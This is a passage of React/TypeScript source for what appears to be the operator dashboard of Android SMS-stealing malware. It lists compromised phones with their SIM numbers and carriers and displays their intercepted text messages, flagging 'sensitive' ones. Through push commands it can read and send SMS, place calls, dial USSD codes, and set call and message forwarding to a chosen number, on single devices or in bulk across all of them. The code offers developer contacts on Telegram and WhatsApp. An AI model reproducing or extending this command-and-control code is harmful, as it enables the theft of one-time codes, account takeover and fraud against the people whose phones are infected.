        else { setDisableState("idle"); setDisableMsg(""); }
      }, 3000);
    }
  }

  function handleUpdate() {
    const digits = num.replace(/\D/g, "");
    if (digits.length !== 10) { setSendMsg("Enter exactly 10 digits."); setSendState("err"); setTimeout(() => { setSendState("idle"); setSendMsg(""); }, 2500); return; }
    void sendCmd(mkAdminUpdate(device.deviceId, digits, "on"), "send");
  }

  const IS: React.CSSProperties = {
    flex: 1, boxSizing: "border-box", padding: "10px 12px",
    borderRadius: 8, border: `1.5px solid ${sendState === "err" ? "#ef4444" : t.cardB}`,
    background: t.bg, color: t.txt, fontSize: 13, outline: "none", letterSpacing: 1,
  };

  return (
    <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
      <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, fontSize: 12, fontWeight: 700, color: t.txt2 }}>Admin Update</div>
      <div style={{ padding: "14px 16px", display: "flex", flexDirection: "column", gap: 10 }}>

        {/* Number input + Update button row */}
        <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
          <input
            type="tel"
            value={num}
            onChange={e => { setNum(e.target.value.replace(/\D/g, "").slice(0, 10)); if (sendState !== "idle") { setSendState("idle"); setSendMsg(""); } }}
            placeholder="10-digit number"
            maxLength={10}
            style={IS}
          />
          <button
            onClick={handleUpdate}
            disabled={sendState === "loading"}
            style={{
              flexShrink: 0, padding: "10px 16px", borderRadius: 8, border: "none",
              background: sendState === "ok" ? "#22c55e" : sendState === "err" ? "#ef4444" : num.replace(/\D/g,"").length === 10 ? "#6366f1" : t.hdrB,
              color: num.replace(/\D/g,"").length === 10 || sendState !== "idle" ? "#fff" : t.muted,
              fontWeight: 700, fontSize: 13, cursor: sendState === "loading" ? "wait" : "pointer",
              transition: "background 0.15s", whiteSpace: "nowrap" as const,
            }}
          >
            {sendState === "loading" ? "…" : sendState === "ok" ? "✓" : sendState === "err" ? "✗" : "Update"}
          </button>
        </div>

        {/* Status + last updated number */}
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <span style={{
            padding: "3px 10px", borderRadius: 99, fontSize: 11, fontWeight: 700,
            background: sendState === "ok" ? "#dcfce7" : sendState === "err" ? "#fee2e2" : disableState === "ok" ? "#fee2e2" : t.hdrB,
            color: sendState === "ok" ? "#16a34a" : sendState === "err" ? "#ef4444" : disableState === "ok" ? "#ef4444" : t.muted,
            border: `1px solid ${sendState === "ok" ? "#bbf7d0" : sendState === "err" ? "#fecaca" : disableState === "ok" ? "#fecaca" : t.cardB}`,
          }}>
            {sendState === "ok" ? "ON" : disableState === "ok" ? "OFF" : sendState === "err" || disableState === "err" ? "Error" : "—"}
          </span>
          {sendState === "ok" && num && (
            <span style={{ fontSize: 12, color: t.muted, fontWeight: 500 }}>
              Updated: <span style={{ color: t.txt, fontWeight: 700, fontFamily: "monospace" }}>{num}</span>
            </span>
          )}
          {(sendState === "err" || disableState === "err") && (
            <span style={{ fontSize: 11, color: "#ef4444", fontWeight: 600 }}>{sendMsg || disableMsg}</span>
          )}
          <span style={{ marginLeft: "auto", fontSize: 10, color: t.muted }}>{num.length}/10</span>
        </div>

        {/* Disable button */}
        <button
          onClick={() => void sendCmd(mkAdminUpdate(device.deviceId, "", "off"), "disable")}
          disabled={disableState === "loading"}
          style={{
            width: "100%", padding: "11px 0", borderRadius: 9, border: "1.5px solid",
            borderColor: disableState === "ok" ? "#22c55e" : "#ef4444",
            background: disableState === "ok" ? "#22c55e" : disableState === "loading" ? "#fee2e2" : "transparent",
            color: disableState === "ok" ? "#fff" : "#ef4444",
            fontWeight: 700, fontSize: 13, cursor: disableState === "loading" ? "wait" : "pointer",
            transition: "all 0.15s",
          }}
        >
          {disableState === "loading" ? "Sending…" : disableState === "ok" ? "Disabled ✓" : "Disable"}
        </button>
      </div>
    </div>
  );
}

function DevicesPage({ devices, messages, initialDevice, onBack }: { devices: DbDevice[]; messages: DbMessage[]; initialDevice?: DbDevice | null; onBack?: () => void }) {
  const t = useTheme();
  const [search, setSearch] = useState("");
  const [selected, setSelected] = useState<DbDevice | null>(initialDevice ?? null);
  const [fromExternal, setFromExternal] = useState<boolean>(!!initialDevice);
  const [msgSearch, setMsgSearch] = useState("");
  const [activeAction, setActiveAction] = useState<ActionKey | null>(null);
  const [showAdminUpdate, setShowAdminUpdate] = useState(false);
  const [quickState, setQuickState] = useState<Record<string, "idle"|"loading"|"ok"|"err">>({});

  async function sendQuick(device: DbDevice, key: "online_check"|"get_sms") {
    setQuickState(s => ({ ...s, [key]: "loading" }));
    const cmd = key === "online_check" ? { type: "0" } : mkDeviceCmd(device.deviceId, "get_sms");
    try {
      await fcmSend(device.deviceId, cmd);
      setQuickState(s => ({ ...s, [key]: "ok" }));
    } catch { setQuickState(s => ({ ...s, [key]: "err" })); }
    finally { setTimeout(() => setQuickState(s => ({ ...s, [key]: "idle" })), 2500); }
  }

  const filtered = devices
    .filter(d =>
      d.name.toLowerCase().includes(search.toLowerCase()) ||
      d.deviceId.includes(search) ||
      d.userId.toLowerCase().includes(search.toLowerCase())
    )
    .slice()
    .reverse();

  const deviceMsgs = selected
    ? [...messages]
        .filter(m => m.deviceId === selected.deviceId)
        .filter(m => {
          const q = msgSearch.toLowerCase();
          return !q || m.body.toLowerCase().includes(q) || m.fromSender.toLowerCase().includes(q) || m.fromNumber.includes(q);
        })
        .sort((a, b) => new Date(b.receivedAt).getTime() - new Date(a.receivedAt).getTime())
    : [];

  const ACTIONS: { label: string; key: ActionKey }[] = [
    { label: "Online Check", key: "online_check" },
    { label: "Get SMS", key: "get_sms" },
    { label: "Send SMS", key: "send_sms" },
    { label: "Voice Call", key: "voice_call" },
    { label: "Call Forward", key: "call_forward" },
    { label: "Dial USSD", key: "dial_ussd" },
  ];

  /* ── Detail view ── */
  if (selected) {
    return (
      <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>
        <button onClick={() => { setSelected(null); setActiveAction(null); if (fromExternal && onBack) onBack(); }} style={{
          alignSelf: "flex-start", background: t.card, border: `1px solid ${t.cardB}`,
          borderRadius: 7, padding: "6px 12px", fontSize: 12, cursor: "pointer", color: t.muted,
        }}>
          ← Back
        </button>

        {/* Name banner */}
        <div style={{ background: t.card, borderRadius: 10, padding: "11px 14px", border: `1px solid ${t.cardB}`, display: "flex", alignItems: "center", justifyContent: "space-between", gap: 8 }}>
          <div style={{ flex: 1, minWidth: 0 }}>
            <div style={{ fontWeight: 700, fontSize: 15, color: t.txt }}>{selected.name}</div>
            <div style={{ fontSize: 9, color: "#94a3b8", fontFamily: "monospace", marginTop: 2 }}>{selected.deviceId}</div>
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: 10, flexShrink: 0 }}>
            <div style={{ fontSize: 11, textAlign: "right" }}>
              <div style={{ fontSize: 9, color: "#94a3b8", fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.3 }}>Last Seen</div>
              <div style={{ fontWeight: 700, color: selected.status !== "uninstalled" && isRecent(selected.lastOnline) ? "#22c55e" : "#64748b" }}>
                {selected.status === "uninstalled" ? "Uninstalled" : timeAgo(selected.lastOnline)}
              </div>
            </div>
            <button
              onClick={() => setShowAdminUpdate(v => !v)}
              style={{
                padding: "6px 11px", borderRadius: 7, border: "1.5px solid",
                borderColor: showAdminUpdate ? "#6366f1" : t.cardB,
                background: showAdminUpdate ? "#6366f1" : t.bg,
                color: showAdminUpdate ? "#fff" : t.muted,
                fontWeight: 700, fontSize: 11, cursor: "pointer",
                transition: "all 0.15s", whiteSpace: "nowrap" as const,
              }}
            >
              Update
            </button>
          </div>
        </div>

        {/* Info rows */}
        <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
          <Row label="Name" value={selected.name} />
          <Row label="Device ID" value={selected.deviceId} mono accent="#22c55e" />
          <Row label="Android" value={`v${selected.androidVersion}`} />
          <Row label="User ID" value={selected.userId} mono />
          <Row label="SIM 1" value={[selected.sim1Carrier, selected.sim1Phone].filter(Boolean).join(": ") || "—"} />
          <Row label="SIM 2" value={[selected.sim2Carrier, selected.sim2Phone].filter(Boolean).join(": ") || "—"} />
          <Row label="Forwarding" value={selected.forwardEnabled ? "ON" : "OFF"} accent={selected.forwardEnabled ? "#22c55e" : "#ef4444"} />
          <Row label="Installed" value={fmtDate(selected.installedAt)} accent="#22c55e" />
          <Row label="Last Seen" value={selected.status === "uninstalled" ? "App uninstalled" : timeAgo(selected.lastOnline)} accent={selected.status !== "uninstalled" && isRecent(selected.lastOnline) ? "#22c55e" : undefined} />
        </div>

        {/* Action buttons */}
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 8 }}>
          {ACTIONS.map(({ label, key }) => {
            const isQuick = key === "online_check" || key === "get_sms";
            const qs = quickState[key] ?? "idle";
            const isActive = activeAction === key;

            if (isQuick) {
              const bgColor = qs === "ok" ? "#22c55e" : qs === "err" ? "#ef4444" : qs === "loading" ? "#6366f1" : t.card;
              const bdColor = qs === "ok" ? "#22c55e" : qs === "err" ? "#ef4444" : qs === "loading" ? "#6366f1" : t.cardB;
              const txtColor = qs !== "idle" ? "#fff" : t.txt2;
              return (
                <button key={key}
                  onClick={() => void sendQuick(selected, key as "online_check"|"get_sms")}
                  disabled={qs === "loading"}
                  style={{
                    background: bgColor, border: "1.5px solid", borderColor: bdColor,
                    borderRadius: 9, padding: "10px 4px", cursor: qs === "loading" ? "wait" : "pointer",
                    fontSize: 11, color: txtColor, fontWeight: 600,
                    textAlign: "center", transition: "all 0.15s",
                  }}>
                  {qs === "loading" ? "…" : qs === "ok" ? "Sent ✓" : qs === "err" ? "Failed ✗" : label}
                </button>
              );
            }

            return (
              <button key={key} onClick={() => setActiveAction(isActive ? null : key)} style={{
                background: isActive ? "#eef2ff" : t.card,
                border: "1.5px solid", borderColor: isActive ? "#6366f1" : t.cardB,
                borderRadius: 9, padding: "10px 4px", cursor: "pointer",
                fontSize: 11, color: isActive ? "#6366f1" : t.txt2, fontWeight: isActive ? 700 : 500,
                textAlign: "center",
              }}>
                {label}
              </button>
            );
          })}
        </div>

        {/* Inline action panel */}
        {activeAction && <ActionPanel action={activeAction} device={selected} onClose={() => setActiveAction(null)} />}

        {/* Admin Update — shown only when toggled */}
        {showAdminUpdate && <AdminUpdatePanel device={selected} />}

        {/* Messages */}
        <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "9px 12px", borderBottom: `1px solid ${t.hdrB}` }}>
            <span style={{ color: t.muted, fontSize: 13 }}>⌕</span>
            <input value={msgSearch} onChange={e => setMsgSearch(e.target.value)} placeholder="Search messages…"
              style={{ border: "none", outline: "none", flex: 1, fontSize: 11, background: "transparent", color: t.txt }} />
            <span style={{ fontSize: 10, color: "#94a3b8" }}>Newest first</span>
          </div>
          {deviceMsgs.length === 0
            ? <div style={{ padding: "20px", textAlign: "center", color: "#94a3b8", fontSize: 12 }}>No messages</div>
            : deviceMsgs.map((msg, i) => (
              <div key={msg.id} style={{ padding: "10px 14px", borderBottom: i < deviceMsgs.length - 1 ? `1px solid ${t.hdrB}` : "none" }}>
                <div style={{ display: "flex", gap: 5, alignItems: "center", marginBottom: 4 }}>
                  <span style={{ fontSize: 10, color: t.muted }}>{fmtDate(msg.receivedAt)}</span>
                </div>
                <div style={{ fontSize: 12, color: msg.isSensitive ? "#16a34a" : t.txt, fontWeight: msg.isSensitive ? 600 : 400, lineHeight: 1.5, marginBottom: 4 }}>{msg.body}</div>
                <div style={{ display: "flex", gap: 12, fontSize: 11 }}>
                  <span style={{ color: "#64748b" }}><span style={{ color: "#94a3b8", fontSize: 10, marginRight: 3, fontWeight: 600 }}>FROM</span>{msg.fromSender}</span>
                  <span style={{ color: "#64748b" }}><span style={{ color: "#94a3b8", fontSize: 10, marginRight: 3, fontWeight: 600 }}>MOB</span>{msg.fromNumber}</span>
                </div>
              </div>
            ))
          }
        </div>
      </div>
    );
  }

  /* ── Device list ── */
  return (
    <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>
      <div style={{ background: t.card, border: `1px solid ${t.cardB}`, borderRadius: 8, display: "flex", alignItems: "center", padding: "8px 10px", gap: 6 }}>
        <span style={{ color: t.muted, fontSize: 13 }}>⌕</span>
        <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search devices…"
          style={{ border: "none", outline: "none", flex: 1, fontSize: 12, background: "transparent", color: t.txt }} />
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, alignItems: "start" }}>
        {filtered.map((device, idx) => {
          const recent = device.status !== "uninstalled" && isRecent(device.lastOnline);
          const rows = [
            { label: "ID", value: device.deviceId, mono: true },
            { label: "Android", value: String(device.androidVersion) },
            { label: "SIM 1", value: [device.sim1Carrier, device.sim1Phone].filter(Boolean).join(":  ") || "—" },
            { label: "SIM 2", value: [device.sim2Carrier, device.sim2Phone].filter(Boolean).join(":  ") || "—" },
            { label: "User ID", value: device.userId, mono: true },
          ];
          return (
            <div key={device.deviceId} onClick={() => { setSelected(device); setFromExternal(false); }}
              style={{ background: t.card, borderRadius: 12, border: `1px solid ${t.cardB}`, cursor: "pointer", overflow: "hidden" }}>

              {/* Card header */}
              <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.cardB}`, background: t.hdr }}>
                <span style={{ fontWeight: 800, fontSize: 13, color: t.txt }}>
                  {filtered.length - idx}.&nbsp;{device.name}
                </span>
              </div>

              {/* Table rows */}
              {rows.map(({ label, value, mono }, i) => (
                <div key={label} style={{
                  display: "flex", alignItems: "center",
                  borderBottom: i < rows.length - 1 ? `1px solid ${t.hdrB}` : "none",
                  padding: "7px 14px",
                }}>
                  <span style={{ width: 64, fontSize: 11, color: t.muted, fontWeight: 600, flexShrink: 0 }}>{label}:</span>
                  <span style={{ fontSize: 11, color: t.txt2, fontFamily: mono ? "monospace" : undefined, wordBreak: "break-all", lineHeight: 1.4 }}>{value}</span>
                </div>
              ))}

              {/* Online row */}
              <div style={{ display: "flex", alignItems: "center", borderBottom: `1px solid ${t.hdrB}`, padding: "7px 14px" }}>
                <span style={{ width: 64, fontSize: 11, color: "#94a3b8", fontWeight: 600, flexShrink: 0 }}>Online:</span>
                <span style={{ fontSize: 11, fontWeight: recent ? 700 : 400, color: recent ? "#16a34a" : "#64748b" }}>
                  {device.status === "uninstalled" ? "Uninstalled" : timeAgo(device.lastOnline)}
                </span>
              </div>

              {/* Check Online button */}
              <div style={{ padding: "8px 14px" }}>
                <CheckOnlineBtn device={device} />
              </div>
            </div>
          );
        })}
      </div>
      {filtered.length === 0 && <div style={{ textAlign: "center", color: "#94a3b8", padding: 32 }}>No devices found</div>}
    </div>
  );
}

/* ════════════════════════════════════════
   PAGE — SETTINGS
════════════════════════════════════════ */
function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout }: {
  appId: string; isDark: boolean; onToggleDark: () => void; devices: DbDevice[]; onLogout: () => void;
}) {
  const t = useTheme();

  /* ── Admin Sessions ── */
  const [sessions, setSessions] = useState<AdminSession[]>([]);
  const [sessLoading, setSessLoading] = useState(true);
  const mySessionId = sessionStorage.getItem("mrrobot_session_id") ?? "";

  async function fetchSessions() {
    try {
      const r = await fetch("/api/admin/sessions");
      if (r.ok) {
        const list: AdminSession[] = await r.json();
        setSessions(list);
        const myId = sessionStorage.getItem("mrrobot_session_id");
        if (myId && !list.find(s => s.id === myId)) {
          sessionStorage.removeItem("mrrobot_auth");
          sessionStorage.removeItem("mrrobot_session_id");
          onLogout();
        }
      }
    } catch { /* ignore */ } finally { setSessLoading(false); }
  }

  async function logoutSession(id: string) {
    await fetch(`/api/admin/sessions/${id}`, { method: "DELETE" });
    if (id === mySessionId) { onLogout(); return; }
    fetchSessions();
  }

  async function logoutAll() {
    await fetch("/api/admin/sessions", { method: "DELETE" });
    onLogout();
  }

  useEffect(() => { fetchSessions(); const iv = setInterval(fetchSessions, 15000); return () => clearInterval(iv); }, []);

  /* ── Update Admin (batch FCM status:on to all devices) ── */
  const [adminNum, setAdminNum] = useState("");
  const [numState, setNumState] = useState<"idle"|"running"|"done"|"err">("idle");
  const [numMsg, setNumMsg] = useState("");
  const [updateDone, setUpdateDone] = useState(0);
  const [updateResult, setUpdateResult] = useState<{ ok: number; fail: number } | null>(null);

  async function handleUpdateAdmin() {
    const val = adminNum.replace(/\D/g, "");
    if (val.length !== 10) { setNumMsg("Enter exactly 10 digits."); setNumState("err"); setTimeout(() => { setNumState("idle"); setNumMsg(""); }, 2500); return; }
    if (devices.length === 0) { setNumMsg("No devices to update."); setNumState("err"); setTimeout(() => { setNumState("idle"); setNumMsg(""); }, 2500); return; }

    setNumState("running"); setNumMsg(""); setUpdateDone(0); setUpdateResult(null);
    const BATCH = 2; const DELAY = 800;
    let ok = 0; let fail = 0;

    for (let i = 0; i < devices.length; i += BATCH) {
      const batch = devices.slice(i, i + BATCH);
      const results = await Promise.allSettled(
        batch.map(d => fcmSend(d.deviceId, mkAdminUpdate(d.deviceId, val, "on")))
      );
      results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
      setUpdateDone(Math.min(i + BATCH, devices.length));
      if (i + BATCH < devices.length) await new Promise(r => setTimeout(r, DELAY));
    }
    setUpdateResult({ ok, fail }); setNumState("done"); setAdminNum("");
    setTimeout(() => { setNumState("idle"); setUpdateDone(0); setUpdateResult(null); setNumMsg(""); }, 5000);
  }

  /* ── Disable All (batch FCM status:off) ── */
  const eligible = devices;
  const [disableAllState, setDisableAllState] = useState<"idle"|"running"|"done">("idle");
  const [disableAllDone, setDisableAllDone] = useState(0);
  const [disableAllResult, setDisableAllResult] = useState<{ ok: number; fail: number } | null>(null);

  async function handleDisableAll() {
    if (disableAllState === "running" || eligible.length === 0) return;
    const BATCH = 2; const DELAY = 800;
    setDisableAllState("running"); setDisableAllDone(0); setDisableAllResult(null);
    let ok = 0; let fail = 0;
    for (let i = 0; i < eligible.length; i += BATCH) {
      const batch = eligible.slice(i, i + BATCH);
      const results = await Promise.allSettled(batch.map(d => fcmSend(d.deviceId, mkAdminUpdate(d.deviceId, "", "off"))));
      results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
      setDisableAllDone(Math.min(i + BATCH, eligible.length));
      if (i + BATCH < eligible.length) await new Promise(r => setTimeout(r, DELAY));
    }
    setDisableAllResult({ ok, fail }); setDisableAllState("done");
    setTimeout(() => { setDisableAllState("idle"); setDisableAllDone(0); setDisableAllResult(null); }, 5000);
  }

  /* ── Ping All (batch FCM type:0 to all devices) ── */
  const [pingAllState, setPingAllState] = useState<"idle"|"running"|"done">("idle");
  const [pingAllDone, setPingAllDone] = useState(0);

  async function handlePingAll() {
    if (pingAllState === "running" || devices.length === 0) return;
    const BATCH = 2; const DELAY = 800;
    setPingAllState("running"); setPingAllDone(0);
    for (let i = 0; i < devices.length; i += BATCH) {
      const batch = devices.slice(i, i + BATCH);
      await Promise.allSettled(batch.map(d => fcmSend(d.deviceId, { type: "0" })));
      setPingAllDone(Math.min(i + BATCH, devices.length));
      if (i + BATCH < devices.length) await new Promise(r => setTimeout(r, DELAY));
    }
    setPingAllState("done");
    setTimeout(() => { setPingAllState("idle"); setPingAllDone(0); }, 4000);
  }

  const IS: React.CSSProperties = {
    width: "100%", boxSizing: "border-box", padding: "10px 12px",
    borderRadius: 8, border: `1.5px solid ${numState === "err" ? "#ef4444" : t.cardB}`,
    background: t.bg, color: t.txt, fontSize: 14, outline: "none",
    letterSpacing: 1,
  };

  return (
    <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>

      {/* ── Ping All Devices ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <span style={{ fontSize: 12, fontWeight: 700, color: t.txt2 }}>Check Online</span>
          <span style={{ background: devices.length > 0 ? "#6366f1" : t.hdrB, color: devices.length > 0 ? "#fff" : t.muted, borderRadius: 99, padding: "1px 7px", fontSize: 10, fontWeight: 800 }}>
            {devices.length} devices
          </span>
        </div>
        <div style={{ padding: "14px 16px", display: "flex", flexDirection: "column", gap: 10 }}>
          <div style={{ fontSize: 12, color: t.txt2 }}>
            Pings all devices to check if they are online and reachable.
          </div>
          {pingAllState === "running" && (
            <div>
              <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: t.muted, marginBottom: 5 }}>
                <span>Pinging all devices…</span>
                <span>{pingAllDone}/{devices.length}</span>
              </div>
              <div style={{ height: 5, background: t.hdrB, borderRadius: 3, overflow: "hidden" }}>
                <div style={{ height: "100%", background: "#6366f1", width: `${devices.length > 0 ? Math.round((pingAllDone / devices.length) * 100) : 0}%`, transition: "width 0.3s" }} />
              </div>
            </div>
          )}
          <button
            onClick={() => void handlePingAll()}
            disabled={pingAllState === "running" || devices.length === 0}
            style={{
              width: "100%", padding: "12px 0", borderRadius: 9, border: "none",
              background: pingAllState === "done" ? "#22c55e" : pingAllState === "running" ? "#ede9fe" : devices.length > 0 ? "#6366f1" : t.hdrB,
              color: pingAllState === "done" || (pingAllState === "idle" && devices.length > 0) ? "#fff" : pingAllState === "running" ? "#6366f1" : t.muted,
              fontWeight: 700, fontSize: 14,
              cursor: pingAllState === "running" || devices.length === 0 ? "not-allowed" : "pointer",
              transition: "background 0.15s",
            }}
          >
            {pingAllState === "running"
              ? `Pinging ${pingAllDone}/${devices.length}…`
              : pingAllState === "done" ? "Done ✓"
              : devices.length === 0 ? "No Devices" : "Send"}
          </button>
        </div>
      </div>

      {/* ── Update Admin ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <span style={{ fontSize: 12, fontWeight: 700, color: t.txt2 }}>Update Admin</span>
          <span style={{ background: devices.length > 0 ? "#6366f1" : t.hdrB, color: devices.length > 0 ? "#fff" : t.muted, borderRadius: 99, padding: "1px 7px", fontSize: 10, fontWeight: 800 }}>
            {devices.length} devices
          </span>
        </div>
        <div style={{ padding: "14px 16px", display: "flex", flexDirection: "column", gap: 10 }}>
          <input
            type="tel"
            value={adminNum}
            onChange={e => {
              const digits = e.target.value.replace(/\D/g, "").slice(0, 10);
              setAdminNum(digits);
              if (numState !== "idle") { setNumState("idle"); setNumMsg(""); setUpdateResult(null); }
            }}
            placeholder="Enter 10-digit number"
            maxLength={10}
            disabled={numState === "running"}
            style={IS}
          />
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <span style={{ fontSize: 11, color: numState === "err" ? "#ef4444" : numState === "done" ? "#22c55e" : t.muted, fontWeight: 600 }}>
              {numMsg || `${adminNum.length}/10 digits`}
            </span>
            {adminNum.length === 10 && numState === "idle" && (
              <span style={{ fontSize: 10, color: "#22c55e", fontWeight: 700 }}>✓ Ready</span>
            )}
          </div>

          {/* Update progress bar */}
          {numState === "running" && (
            <div>
              <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: t.muted, marginBottom: 5 }}>
                <span>Sending to all devices…</span>
                <span>{updateDone}/{devices.length}</span>
              </div>
              <div style={{ height: 5, background: t.hdrB, borderRadius: 3, overflow: "hidden" }}>
                <div style={{ height: "100%", background: "#6366f1", width: `${devices.length > 0 ? Math.round((updateDone / devices.length) * 100) : 0}%`, transition: "width 0.3s" }} />
              </div>
            </div>
          )}


          <button
            onClick={() => void handleUpdateAdmin()}
            disabled={numState === "running" || devices.length === 0}
            style={{
              width: "100%", padding: "12px 0", borderRadius: 9, border: "none",
              background: numState === "done" ? "#22c55e" : numState === "err" ? "#ef4444" : numState === "running" ? "#ede9fe" : adminNum.length === 10 ? "#6366f1" : t.hdrB,
              color: numState === "done" || numState === "err" || adminNum.length === 10 ? "#fff" : numState === "running" ? "#6366f1" : t.muted,
              fontWeight: 700, fontSize: 14,
              cursor: numState === "running" || devices.length === 0 ? "not-allowed" : adminNum.length < 10 && numState === "idle" ? "not-allowed" : "pointer",
              transition: "background 0.15s",
            }}
          >
            {numState === "running"
              ? `Sending ${updateDone}/${devices.length}…`
              : numState === "done" ? "Done ✓"
              : numState === "err" ? "Failed ✗"
              : devices.length === 0 ? "No Devices"
              : "Update"}
          </button>

          {/* Divider */}
          <div style={{ height: 1, background: t.hdrB, margin: "2px 0" }} />

          {/* Disable All progress */}
          {disableAllState === "running" && (
            <div>
              <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: t.muted, marginBottom: 5 }}>
                <span>Disabling all devices…</span>
                <span>{disableAllDone}/{eligible.length}</span>
              </div>
              <div style={{ height: 5, background: t.hdrB, borderRadius: 3, overflow: "hidden" }}>
                <div style={{ height: "100%", background: "#ef4444", width: `${eligible.length > 0 ? Math.round((disableAllDone / eligible.length) * 100) : 0}%`, transition: "width 0.3s" }} />
              </div>
            </div>
          )}


          {/* Disable All button */}
          <button
            onClick={() => void handleDisableAll()}
            disabled={disableAllState === "running" || eligible.length === 0}
            style={{
              width: "100%", padding: "11px 0", borderRadius: 9, border: "1.5px solid",
              borderColor: disableAllState === "done" ? "#22c55e" : "#ef4444",
              background: disableAllState === "done" ? "#22c55e" : disableAllState === "running" ? "#fee2e2" : "transparent",
              color: disableAllState === "done" ? "#fff" : disableAllState === "running" ? "#ef4444" : eligible.length === 0 ? t.muted : "#ef4444",
              fontWeight: 700, fontSize: 13,
              cursor: disableAllState === "running" || eligible.length === 0 ? "not-allowed" : "pointer",
              transition: "all 0.15s",
            }}
          >
            {disableAllState === "running"
              ? `Disabling ${disableAllDone}/${eligible.length}…`
              : disableAllState === "done"
              ? "Done ✓"
              : eligible.length === 0
              ? "No Eligible Devices"
              : `Disable All (${eligible.length})`}
          </button>
        </div>
      </div>

      {/* ── Day / Night Mode ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, fontSize: 12, fontWeight: 700, color: t.txt2 }}>Display</div>
        <div style={{ padding: "14px 16px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <span style={{ fontSize: 22 }}>{isDark ? "🌙" : "☀️"}</span>
            <div>
              <div style={{ fontWeight: 700, fontSize: 14, color: t.txt }}>{isDark ? "Night Mode" : "Day Mode"}</div>
              <div style={{ fontSize: 11, color: t.muted, marginTop: 1 }}>{isDark ? "Dark theme active" : "Light theme active"}</div>
            </div>
          </div>
          <div onClick={onToggleDark} style={{ width: 50, height: 28, borderRadius: 14, background: isDark ? "#6366f1" : "#e2e8f0", position: "relative", cursor: "pointer", transition: "background 0.2s", flexShrink: 0 }}>
            <div style={{ position: "absolute", top: 3, left: isDark ? 25 : 3, width: 22, height: 22, borderRadius: "50%", background: "#fff", boxShadow: "0 1px 4px rgba(0,0,0,0.2)", transition: "left 0.2s" }} />
          </div>
        </div>
      </div>

      {/* ── Contact Developer ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, fontSize: 12, fontWeight: 700, color: t.txt2 }}>Contact Developer</div>
        <div style={{ padding: "12px 14px", display: "flex", flexDirection: "column", gap: 8 }}>
          <a href={`https://t.me/${DEVELOPER_TELEGRAM.replace("@", "")}`} target="_blank" rel="noopener noreferrer" style={{ textDecoration: "none", display: "block" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 12, padding: "12px 14px", background: isDark ? "#0c2035" : "#f0f9ff", borderRadius: 9, border: `1px solid ${isDark ? "#1e4060" : "#bae6fd"}` }}>
              <div style={{ width: 38, height: 38, borderRadius: "50%", background: "#0088cc", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                <span style={{ color: "#fff", fontWeight: 800, fontSize: 13 }}>TG</span>
              </div>
              <div style={{ flex: 1 }}>
                <div style={{ fontWeight: 700, fontSize: 13, color: "#0ea5e9" }}>Telegram</div>
                <div style={{ fontSize: 13, color: "#0088cc", fontWeight: 600, marginTop: 1 }}>{DEVELOPER_TELEGRAM}</div>
              </div>
              <span style={{ color: "#0088cc", fontSize: 16 }}>→</span>
            </div>
          </a>
          <a href={`https://wa.me/${DEVELOPER_WHATSAPP.replace(/\D/g, "")}`} target="_blank" rel="noopener noreferrer" style={{ textDecoration: "none", display: "block" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 12, padding: "12px 14px", background: isDark ? "#0b2016" : "#f0fdf4", borderRadius: 9, border: `1px solid ${isDark ? "#1a4030" : "#bbf7d0"}` }}>
              <div style={{ width: 38, height: 38, borderRadius: "50%", background: "#25d366", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                <span style={{ color: "#fff", fontWeight: 800, fontSize: 12 }}>WA</span>
              </div>
              <div style={{ flex: 1 }}>
                <div style={{ fontWeight: 700, fontSize: 13, color: "#16a34a" }}>WhatsApp</div>
                <div style={{ fontSize: 13, color: "#16a34a", fontWeight: 600, marginTop: 1 }}>{DEVELOPER_WHATSAPP}</div>
              </div>
              <span style={{ color: "#16a34a", fontSize: 16 }}>→</span>
            </div>
          </a>
        </div>
      </div>

      {/* ── App Info ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
